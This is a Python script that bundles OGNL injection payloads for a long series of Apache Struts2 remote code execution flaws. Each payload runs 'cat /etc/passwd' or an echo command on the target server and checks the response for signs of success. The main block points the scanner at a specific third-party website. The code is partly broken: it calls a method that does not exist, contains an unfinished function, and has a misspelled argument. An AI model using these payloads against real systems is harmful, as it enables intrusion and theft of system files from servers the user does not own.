#coding=utf-8

import requests
import re
import sys

class Struts:
    def __init__(self):
        self.header={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
        self.S2003007="""?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'cat /etc/passwd\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"""
        self.S2007="""?id='+(#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#cmd="cat /etc/passwd",#ret=@java.lang.Runtime@getRuntime().exec(#cmd),#data=new+java.io.DataInputStream(#ret.getInputStream()),#res=new+byte[500],#data.readFully(#res),#echo=new+java.lang.String(#res),#out=@org.apache.struts2.ServletActionContext@getResponse(),#out.getWriter().println(#echo))+'"""
        self.S2009="""?foo=(#context["xwork.MethodAccessor.denyMethodExecution"]=+new+java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]=+new+java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('cat /etc/passwd'))(meh)&z[(foo)('meh')]=true"""
        self.S2012013="""?a=1${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('cat /etc/passwd').getInputStream(),#b=new+java.io.InputStreamReader(#a),#c=new+java.io.BufferedReader(#b),#d=new+char[50000],#c.read(#d),#sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#sbtest.println(#d),#sbtest.close())}"""
        self.S2016="""?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[] {'cat /etc/passwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader (#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt= #context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println (#e),#matt.getWriter().flush(),#matt.getWriter().close()}"""
        self.S2019="""?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'cat /etc/passwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"""
        self.S2032037="""?method:#_memberAccess[#parameters.name1[0]]=true,#_memberAccess[#parameters.name[0]]=true,#_memberAccess[#parameters.name2[0]]={},#_memberAccess[#parameters.name3[0]]={},#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=cat /etc/passwd&pp=\\\\A&ppp= &encoding=UTF-8"""
        self.S2045046={'Content-Type':"""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo c4ca4238a0b923820dcc509a6f75849b').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""}
        self.S2048={'Content-Type':"""%{(.com/#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""}
        self.DevMode="""?debug=command&expression=#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("cat /etc/passwd").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()"""
        self.proxies = {"http": "http://127.0.0.1:8080"}

    def Struts_url(self,url):
        #url_scan=urllib2.urlopen(url,timeout=0.5)
        resp = requests.get(url)
        html = resp.text
        re_scan=re.compile(r"root:x:0:0:root",re.DOTALL)
        flag = re.findall(re_scan,html)
        if flag:
            print("yesyesyesyesyesyesyesyesyesyesyesyesyes");
        else:
            pass

    def Struct_S2032037(self,url):
        resp = requests.get(url,headrs=self.S2032037)
        html = resp.text
        re_scan = re.compile(r"root:x:0:0:root",re.DOTALL)
        flag = re.findall(re_scan,html)
        if flag:
            print("yesyesyesyesyesyesyesyesyesyesyesyes")
        else:
            pass

    def Struct_S2045046(self,url):
        print(url)
        resp = requests.get(url,headers=self.S2045046,proxies=self.proxies)
        html = resp.text
        re_scan=re.compile(r"c4ca4238a0b923820dcc509a6f75849b",re.DOTALL)
        flag = re.findall(re_scan,html)
        if flag:
            print("Struct_S2045046")
        else:
            pass

    def Struct_S2046(self,url):
        resp = requests


    def Struts_for(self,url):
        self.Struct_S2048(url)
        exit()

        try:
            self.Struts_url(url.strip()+self.S2003007)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2007)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2009)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2012013)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2016)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2019)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.S2032037)
        except Exception:
            pass
        try:
            self.Struts_url(url.strip()+self.DevMode)
        except Exception:
            pass

        try:
            self.Struct_S2032037(url.strip())
        except Exception:
            pass
        try:
            self.Struct_S2045046(url.strip())
        except Exception:
            pass


if __name__ == '__main__':
    Struts_url = Struts()
    Struts_url.Struts_for("https://www.tjinsuo.com/pcportal/commonNotLogin/toHomePage.do")


